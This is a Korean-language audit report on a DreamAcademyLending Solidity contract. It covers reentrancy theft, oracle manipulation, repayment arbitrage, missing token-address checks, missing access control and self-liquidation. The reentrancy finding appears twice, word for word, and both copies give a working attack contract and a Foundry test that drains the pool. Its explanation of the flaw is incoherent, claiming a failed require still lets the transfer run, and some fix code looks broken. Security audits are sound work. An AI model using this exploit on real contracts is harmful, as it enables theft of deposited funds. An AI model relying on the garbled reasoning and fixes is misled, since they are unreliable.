
# 에치금 출금 로직 결함 및 재진입 기술을 활용한 자금 탈취1<br/>

File: DreamAcademyLending.sol <br/>
Function: withdraw(address _tokenAddress, uint256 _amount)<br/>
Line Number: 178-218 <br/>

https://github.com/Gamj4tang/Audit/blob/9f93e626f86beb865f0eec63a68dd4f18a4686f7/src/DreamAcademyLending.sol#L178-L218
<br/>

## Description
이 함수는 withdraw를 요청하는 사용자로부터 _tokenAddress와 _amount를 받아와 vaults 매핑에서 해당 사용자의 정보를 가져와, 출금 가능한 금액을 계산합니다. 그리고 _amount를 사용자가 보유한 ETH 자산에서 차감한 후, 사용자의 주소로 _amount만큼 ETH를 송금합니다.
그러나 이 함수에서는 재진입(reentrancy) 기술을 통해 출금 로직 결함이 발생할 수 있습니다. 재진입 기술이란 함수 호출 중에 다른 함수를 재귀적으로 호출할 수 있는 기술을 의미합니다. 이 함수에서 재진입 기술을 활용하면, attacker가 다음과 같은 방식으로 공격할 수 있습니다.
attacker는 출금 가능한 금액보다 큰 _amount를 요청합니다.
이때 tempVault.collateralETH - availableWithdraw 조건문이 false를 반환하므로, require 구문이 실패합니다.
그러면 attacker는 tempVault.collateralETH -= _amount; 구문을 건너뛰고 payable(msg.sender).call{value: _amount}(""); 구문을 실행합니다.
만약 attacker가 호출한 함수가 이 함수를 재귀적으로 호출하면, tempVault.collateralETH -= _amount; 구문이 다시 실행되어 attacker가 보유한 모든 자산을 탈취할 수 있습니다.
이러한 결함은 attacker가 탈취한 금액이 모두 출금 가능한 금액보다 작을 때까지 반복될 수 있습니다. 이러한 결함으로 인해 attacker는 vaults 매핑에서 자신의 정보를 업데이트하여 출금 가능한 금액을 증가시키거나, 출금 가능한 금액을 초과하는 금액을 출금할 수 있으므로 심각한 보안 위협이 될 수 있습니다.

```solidity
contract ReentrancyAttack {
    DreamAcademyLending public target;
    address payable public owner;

    constructor(DreamAcademyLending _target) {
        target = _target;
        owner = payable(msg.sender);
    }

    // 공격을 시작하는 함수입니다.
    function attack(address _tokenAddress, uint256 _amount) external payable{
        require(msg.sender == owner, "Not authorized");
        target.deposit{value: _amount}(_tokenAddress, _amount);
        target.withdraw(_tokenAddress, _amount);
    }

    // 컨트랙트가 받은 Ether를 소유자에게 전송하는 함수입니다.
    function withdraw() external {
        require(msg.sender == owner, "Not authorized");
        owner.transfer(address(this).balance);
    }

    // 이 컨트랙트는 Fallback 함수를 이용하여 재진입 공격을 수행합니다.
    fallback() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(address(0x0), msg.value);
        }
    }

    // 컨트랙트가 받은 Ether의 잔액을 확인하는 함수입니다.
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```
각기다른 유저가 100000000 이더를 예치 총 300000000 이더의 예치금 풀이 생성 된후 공격자는 해당풀의 출금 함수의 결함을 확인하고 재진입 기술을 통해 해당 출금시 입금자 상태 정보 및 기타 상태 데이터에 대한 검증 로직에 대한 결함을 통해 call 로우 콜을 활용하여 계속해서 출금을 진행합니다. 이로 인해 해당 프로토콜내 모든 자금을 탈취 당합니다.
```solidity

// ReentrancyAttack.sol interactions
function testReAttack() external {
    vm.deal(user1, 100000000 ether);
    vm.startPrank(user1);
    lending.deposit{value: 100000000 ether}(address(0x00), 100000000 ether);
    vm.stopPrank();

    vm.deal(user3, 100000000 ether);
    vm.startPrank(user3);
    lending.deposit{value: 100000000 ether}(address(0x00), 100000000 ether);
    vm.stopPrank();


    vm.deal(user2, 100000000 ether);
    vm.startPrank(user2);

    ReentrancyAttack attack = new ReentrancyAttack(lending);
    uint _b = attack.getBalance();
    emit log_named_uint("attack balance", _b);
    
    attack.attack{value: 100000000 ether}(address(0x0), 100000000 ether);

    uint _a = attack.getBalance();
    emit log_named_uint("attack balance", _a);
}
```

## Impact
Severity: Critical <br/>
공격자는 이 취약점을 악용하여 상태가 업데이트되기 전에 인출 함수를 반복적으로 호출하여 컨트랙트에서 사용 가능한 모든 자산을 인출할 수 있습니다. 사용자가 볼트에서 이더를 출금하려고 하면, 이 함수는 사용자가 충분한 담보를 보유하고 있는지, 출금 가능한 금액이 요청된 금액보다 큰지 확인합니다. 그러나 이 기능은 먼저 사용자의 담보 잔액에서 요청 금액을 차감한 다음 요청 금액을 사용자에게 보냅니다.해당 함수는 자금을 이체하기 전에 계약 상태를 확인하지 않기 때문에 공격자가 모든 자산을 유출할 수 있습니다.

## Mitigation
이 취약점을 완화하려면 자금을 이체하기 전에 컨트랙트 상태를 업데이트해야 합니다. 이는 상태 변수를 도입하여 인출이 진행 중인지 추적한 다음, 해당 변수를 사용하여 이전 트랜잭션이 완료될 때까지 추가 인출을 중지함으로써 달성할 수 있습니다. 또 다른 방법은 풀 오버 푸시 패턴을 사용해 자금을 이체하는 것입니다. 이 패턴에서는 컨트랙트가 이체를 시작하지 않고 대신 사용자가 컨트랙트에서 자금을 인출할 수 있도록 합니다. 또한, 컨트랙트는 출금 대기열을 사용해 출금을 하나씩 처리하여 재입금이 발생하지 않도록 할 수 있습니다.
```solidity
 uint256 initialReserve = _totalReserve[msg.sender];

if (initialReserve >= amount) {
    _totalReserve[msg.sender] -= amount;
    _totalReservePool -= amount;
} else {
    _totalReserve[msg.sender] = 0;
    _totalReservePool -= amount;
}

if (tokenAddress == address(usdc)) {
    usdc.transfer(msg.sender, amount);
} else {
    payable(msg.sender).call{value: amount}("");
}
```

# 에치금 출금 로직 결함 및 재진입 기술을 활용한 자금 탈취2<br/>

File: DreamAcademyLending.sol <br/>
Function: withdraw(address _tokenAddress, uint256 _amount)<br/>
Line Number: 117-131 <br/>

https://github.com/Gamj4tang/Audit/blob/f246a69b10002401149a0ffeb71e7f50d24aa0fa/src/DreamAcademyLending.sol#L117-L131
<br/>

## Description
이 함수는 withdraw를 요청하는 사용자로부터 _tokenAddress와 _amount를 받아와 vaults 매핑
에서 해당 사용자의 정보를 가져와, 출금 가능한 금액을 계산합니다. 그리고 _amount를 사용자가 보유한 ETH 자산에서 차감한 후, 사용자의 주소로 _amount만큼 ETH를 송금합니다.
그러나 이 함수에서는 재진입(reentrancy) 기술을 통해 출금 로직 결함이 발생할 수 있습니다. 재진입 기술이란 함수 호출 중에 다른 함수를 재귀적으로 호출할 수 있는 기술을 의미합니다. 이 함수에서 재진입 기술을 활용하면, attacker가 다음과 같은 방식으로 공격할 수 있습니다.
attacker는 출금 가능한 금액보다 큰 _amount를 요청합니다.
이때 tempVault.collateralETH - availableWithdraw 조건문이 false를 반환하므로, require 구문이 실패합니다.
그러면 attacker는 tempVault.collateralETH -= _amount; 구문을 건너뛰고 payable(msg.sender).call{value: _amount}(""); 구문을 실행합니다.
만약 attacker가 호출한 함수가 이 함수를 재귀적으로 호출하면, tempVault.collateralETH -= _amount; 구문이 다시 실행되어 attacker가 보유한 모든 자산을 탈취할 수 있습니다.
이러한 결함은 attacker가 탈취한 금액이 모두 출금 가능한 금액보다 작을 때까지 반복될 수 있습니다. 이러한 결함으로 인해 attacker는 vaults 매핑에서 자신의 정보를 업데이트하여 출금 가능한 금액을 증가시키거나, 출금 가능한 금액을 초과하는 금액을 출금할 수 있으므로 심각한 보안 위협이 될 수 있습니다.

```solidity
contract ReentrancyAttack {
    DreamAcademyLending public target;
    address payable public owner;

    constructor(DreamAcademyLending _target) {
        target = _target;
        owner = payable(msg.sender);
    }

    // 공격을 시작하는 함수입니다.
    function attack(address _tokenAddress, uint256 _amount) external payable{
        require(msg.sender == owner, "Not authorized");
        target.deposit{value: _amount}(_tokenAddress, _amount);
        target.withdraw(_tokenAddress, _amount);
    }

    // 컨트랙트가 받은 Ether를 소유자에게 전송하는 함수입니다.
    function withdraw() external {
        require(msg.sender == owner, "Not authorized");
        owner.transfer(address(this).balance);
    }

    // 이 컨트랙트는 Fallback 함수를 이용하여 재진입 공격을 수행합니다.
    fallback() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(address(0x0), msg.value);
        }
    }

    // 컨트랙트가 받은 Ether의 잔액을 확인하는 함수입니다.
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```
각기다른 유저가 100000000 이더를 예치 총 300000000 이더의 예치금 풀이 생성 된후 공격자는 해당풀의 출금 함수의 결함을 확인하고 재진입 기술을 통해 해당 출금시 입금자 상태 정보 및 기타 상태 데이터에 대한 검증 로직에 대한 결함을 통해 call 로우 콜을 활용하여 계속해서 출금을 진행합니다. 이로 인해 해당 프로토콜내 모든 자금을 탈취 당합니다.
```solidity

// ReentrancyAttack.sol interactions
function testReAttack() external {
    vm.deal(user1, 100000000 ether);
    vm.startPrank(user1);
    lending.deposit{value: 100000000 ether}(address(0x00), 100000000 ether);
    vm.stopPrank();

    vm.deal(user3, 100000000 ether);
    vm.startPrank(user3);
    lending.deposit{value: 100000000 ether}(address(0x00), 100000000 ether);
    vm.stopPrank();


    vm.deal(user2, 100000000 ether);
    vm.startPrank(user2);

    ReentrancyAttack attack = new ReentrancyAttack(lending);
    uint _b = attack.getBalance();
    emit log_named_uint("attack balance", _b);
    
    attack.attack{value: 100000000 ether}(address(0x0), 100000000 ether);

    uint _a = attack.getBalance();
    emit log_named_uint("attack balance", _a);
}
```

## Impact
Severity: Critical <br/>
공격자는 이 취약점을 악용하여 상태가 업데이트되기 전에 인출 함수를 반복적으로 호출하여 컨트랙트에서 사용 가능한 모든 자산을 인출할 수 있습니다. 사용자가 볼트에서 이더를 출금하려고 하면, 이 함수는 사용자가 충분한 담보를 보유하고 있는지, 출금 가능한 금액이 요청된 금액보다 큰지 확인합니다. 그러나 이 기능은 먼저 사용자의 담보 잔액에서 요청 금액을 차감한 다음 요청 금액을 사용자에게 보냅니다.해당 함수는 자금을 이체하기 전에 계약 상태를 확인하지 않기 때문에 공격자가 모든 자산을 유출할 수 있습니다.

## Mitigation
이 취약점을 완화하려면 자금을 이체하기 전에 컨트랙트 상태를 업데이트해야 합니다. 이는 상태 변수를 도입하여 인출이 진행 중인지 추적한 다음, 해당 변수를 사용하여 이전 트랜잭션이 완료될 때까지 추가 인출을 중지함으로써 달성할 수 있습니다. 또 다른 방법은 풀 오버 푸시 패턴을 사용해 자금을 이체하는 것입니다. 이 패턴에서는 컨트랙트가 이체를 시작하지 않고 대신 사용자가 컨트랙트에서 자금을 인출할 수 있도록 합니다. 또한, 컨트랙트는 출금 대기열을 사용해 출금을 하나씩 처리하여 재입금이 발생하지 않도록 할 수 있습니다.
```solidity
function withdraw(address _tokenAddress, uint256 _amount) external {
    _update();
    uint256 availableWithdraw = vaults[msg.sender].borrowUSDC * 1e18 / oracle.getPrice(address(0x0)) * LTV / 100;
    VaultInfo storage tempVault = vaults[msg.sender];

    require(tempVault.collateralETH >= _amount, "INSUFFICIENT_AMOUNT");
    require(tempVault.collateralETH - availableWithdraw >= _amount);

    tempVault.collateralETH -= _amount;
    vaults[msg.sender] = tempVault;

    (bool success, ) = payable(msg.sender).call{value: _amount}("");
    require(success, "ERROR");
}
```

# 오라클 조작을 통한 청산 및 담보 가격 변동<br/>

File: DreamAcademyLending.sol <br/>
Function: withdraw(address _tokenAddress, uint256 _amount)<br/>
Line Number: 110-111 <br/>

https://github.com/Gamj4tang/Audit/blob/f246a69b10002401149a0ffeb71e7f50d24aa0fa/src/DreamAcademyLending.sol#L110-L111 
https://github.com/Gamj4tang/Audit/blob/f246a69b10002401149a0ffeb71e7f50d24aa0fa/src/DreamAcademyLending.sol#L98-L104
<br/>
## Description
검증 로직이 따로 존재 하지 않기 때문에 상환 금액에 따른 상태 변수 조절 작업 진행, 담보 이더 값에 대해서 트리거가 가능해집니다. 현재 오라클 정보를 가져오기 위한 getPirce 함수는 외부에서 인자를 조절할 수 있기 때문에 처음 셋업된 address(0), USDC 각 주소 정보가 담긴 배열을 참조합니다. 그렇기 때문에 실제 청산을 하거나 계산을 진행할떄 토큰 주소를 변경함으로써 오라클 정보를 임의로 조작이 가능하고 이로 인해 가격 변동이 발생합니다. 

## Impact
Severity: Medium <br/>
주요 기능에서 사용중인 가격 계산에 있어 오라클은 정말 중요한 역화을 당담하고 있습니다. 이처럼 외부에 의해 값이 조작된다면, 신뢰성이 떨어지고 각 담보에 대한 청산 비율 및 가격 변동이 달라져 청산이 불가능해질 수 있습니다.

## Mitigation
현재 오라클 정보를 조회할 수 있도록 구현된 API 구조를 변경하여 프로토콜 구조내 하드코딩된 주소를 사용해 데이터 조회만 할 수 있도록 구성하는 것이 좋습니다.

# 오라클 기반 담보 상환 가격에 따른 차익 발생
File: DreamAcademy.sol <br/>
Function: repay(address tokenAddress, uint256 amount) <br/>
Line Number: 172-201 <br/>
https://github.com/Gamj4tang/Audit/blob/bd5fab0c28da7b02a0f79c7a86c5f87b0b443dbf/src/DreamAcademyLending.sol#L172-L201 <br/>

## Description
사용자가 상환하는 금액(25 USDC)을 기반으로 담보에서 반환할 Ether의 양을 계산합니다. 이 경우, (25 * 10 ** 18) / 100 = 0.25 Ether를 반환해야 합니다. 사용자의 빌린 금액에서 상환한 금액을 뺍니다. (50 USDC - 25 USDC = 25 USDC) 사용자의 담보된 Ether에서 반환할 Ether를 뺍니다. (1 Ether - 0.25 Ether = 0.75 Ether) 사용자가 아직 25 USDC를 더 상환해야 하므로, 남아있는 담보된 Ether(0.75 Ether)는 반환되지 않습니다. 이제 사용자가 남은 25 USDC를 상환하려고 할 경우, 남은 빌린 금액이 0이 되므로 담보된 Ether인 0.75 Ether가 반환됩니다. 이렇게 수정된 repay 함수를 사용하면 사용자가 빌린 금액을 모두 상환하지 않으면 담보를 가져올 수 없게 됩니다.

## Impact
Severity: Medium
상환 로직을 수행할 시 실제 amount 값을 그대로 전달하는 것이 아니라, 상환 절차에 맞게 오라클 가격을 대입 해야 합니다. 그렇지 않을 경우 실질적인 가격과 매칭이 안되기 때문에 프로토콜의 신뢰성 및 차익이 발생할 수 있습니다.

## Mitigation
```solidity
function repay(address tokenAddress, uint256 amount) external {
    require(amount > 0);

    _createBook(msg.sender);
    _updateInterest();

    require(tokenUSDC.allowance(msg.sender, address(this)) >= amount);

    uint256 collateralValue = (amount * 10 ** 18) / currentOraclePrice; // 현재 오라클 가격을 사용하여 반환할 담보(Ether)를 계산합니다.
    require(participateBooks[msg.sender].eth_deposited >= collateralValue);

    participateBooks[msg.sender].usdc_borrow -= amount;
    participateBooks[msg.sender].eth_deposited -= collateralValue;
    tokenUSDC.transferFrom(msg.sender, address(this), amount);

    // 사용자가 모든 빌린 금액을 상환한 경우, 담보된 Ether를 반환합니다.
    if (participateBooks[msg.sender].usdc_borrow == 0) {
        uint256 remainingCollateral = participateBooks[msg.sender].eth_deposited;
        participateBooks[msg.sender].eth_deposited = 0;
        msg.sender.transfer(remainingCollateral);
    }
}
```
사용자가 상환하는 금액에 따라 담보에서 반환할 Ether의 양이 적절하게 계산되어, 빌린 금액을 모두 상환하지 않으면 담보를 가져올 수 없게 됩니다.


# 잘못된 ERC20 토큰 주소에 대한 불충분한 검증<br/>
File: DreamAcademyLending.sol <br/>
Function: deposit(address tokenAddress, uint256 amount)<br/>
Line Number: 146-151 <br/>

https://github.com/Gamj4tang/Audit/blob/fd3baab9a9c6384e6dfb767c23ce2f81cc1de913/src/DreamAcademyLending.sol#L146-L151

## Description
토큰 주소가 잘못된 경우 외부 다른 토큰 주소를 사용함에 따라 문제가 발생할 수 있지만,특정 공격 연계에 같이 사용될 수 있기 때문에 주의 해야 합니다. 프로토콜 내에서 허용된 토큰 주소 검사 로직이 필요 혹은 화이트리스트 형식의 검증 방식으로 동작해야 합니다.

## Impact
Security: Low
외부 ERC20 토큰 주소를 활용해서 각 allowance, transferFrom 함수를 임의로 변경하여 호출이 가능하기 때문에 이러한 결함이 있기 때문에 연계 공격으로 활용도 가 높습니다.

## Mitigation
tokenAddress에 대한 주소 정보를 검증하는 로직이 추가 혹은 처음 컨트랙트를 배포할 당시 하드코딩 형태로 토큰 주소를 등록하여 사용하는 방식으로 해결할 수 있습니다.



# 프로토콜 초기 설정 함수 권한 미흡<br/>

File: DreamAcademyLending.sol <br/>
Function: initializeLendingProtocol(address usdc, uint256 tokenAmount) 
Line Number: 43-45 <br/>

https://github.com/Gamj4tang/Audit/blob/6665539022814a1f51dccf0ae4d30b264ba74891/src/DreamAcademyLending.sol#L43-L45

## Description
초기화대출 프로토콜 함수는 토큰 주소로 입금을 받아 대출 프로토콜을 초기화합니다.
하지만 이 함수는 공개로 표시되어 누구나 호출할 수 있습니다. 악의적인 사용자가 임의의 토큰 주소로 이 함수를 호출하려고 할 경우 잠재적인 취약점이 발생할 수 있으며, 이로 인해 자금 손실이나 서비스 거부 공격과 같은 예기치 않은 동작이 발생할 수 있습니다.
또한, 이 함수에는 접근 제어 검사가 없으므로 권한이 없더라도 누구나 이 함수를 실행하여 map_user_deposit_token_amount 매핑을 업데이트할 수 있습니다.

## Impact
Security: Low
공격자는 임의의 토큰 주소로 초기화대출 프로토콜 함수를 호출하고 임의의 양의 토큰을 입금할 수 있습니다. 입금된 토큰이 렌딩 프로토콜과 호환되지 않는 경우 자금이 손실되거나 서비스 거부 공격이 발생할 수 있습니다.

또한 공격자는 다른 임의의 토큰 주소를 사용하여 초기화LendingProtocol 함수를 여러 번 호출할 수 있으며, 이로 인해 map_user_deposit_token_amount 매핑이 여러 번 업데이트되어 의도하지 않은 동작이나 보안 취약점이 발생할 수 있습니다.

## Mitigation
이 취약점을 해결하려면 권한이 있는 사용자만 초기화대출 프로토콜 함수를 실행할 수 있도록 액세스 제어 검사를 추가해야 합니다. 또한 이 함수는 대출 프로토콜과 호환되는 토큰만 허용해야 하며, 입금 로직을 실행하기 전에 토큰 주소의 유효성을 검사해야 합니다.

한 가지 가능한 해결책은 대출 프로토콜에 입금할 수 있는 승인된 토큰의 화이트리스트를 추가하는 것입니다. 또 다른 해결책은 입금 로직을 진행하기 전에 토큰 주소가 유효한지 확인하기 위해 require 문을 사용하는 것입니다.

또한 입금 로직이 올바르게 실행되고 입금이 map_user_deposit_token_amount 매핑에 정확하게 기록되도록 하기 위해 추가 오류 검사를 추가해야 할 수도 있습니다.


# 청산 로직 수행시 청산인이 자기 자신인 경우 문제가 발생
File: DreamAcademy.sol <br/>
Function: liquidate(address user, address tokenAddress, uint256 amount) <br/>
Line Number: 172-201 <br/>
https://github.com/Gamj4tang/Audit/blob/bd5fab0c28da7b02a0f79c7a86c5f87b0b443dbf/src/DreamAcademyLending.sol#L211-L239 <br/>

## Description
청산을 진행할시 특정 다른 사람의 담보를 기준으로 청산 요청을 보내지만, 실제 해당 호출시 만약 청산을 진행하는 주체가 본인으로 될 시 내부 적인 문제가 발생할 수 있습니다.

## Impact
Severity: Low
청산을 진행하는 주체가 본인으로 되어있을 경우, 청산을 진행하는 주체의 담보를 청산하는 것이 아닌 본인의 담보를 청산하는 것으로 판단됩니다. 이 경우 청산을 진행하는 주체의 담보가 부족할 경우 청산이 진행되지 않습니다. 하지만 청산을 진행하는 주체의 담보가 충분할 경우 청산을 진행하는 주체의 담보가 부족한 것으로 판단되어 청산이 진행되지 않습니다.

## Mitigation
호출시 msg.sender가 user 와 동일한 경우 이에 대한 1차적인 가드를 설정해야 하며, 내부 로직에서 예외적인 문제가 발생하지 않도록 구성해야 합니다.


